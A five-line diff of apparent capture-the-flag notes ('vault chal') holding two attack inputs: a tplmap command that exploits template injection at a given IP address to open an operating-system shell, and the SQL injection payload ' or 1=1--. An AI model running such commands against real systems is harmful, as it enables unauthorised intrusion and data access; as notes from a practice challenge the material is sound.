@@ -1,0 +1,5 @@
+python tplmap.py -u 'http://104.154.106.182:5050/?secret=flag' --os-shell
+
+vault chal
+
+' or 1=1--
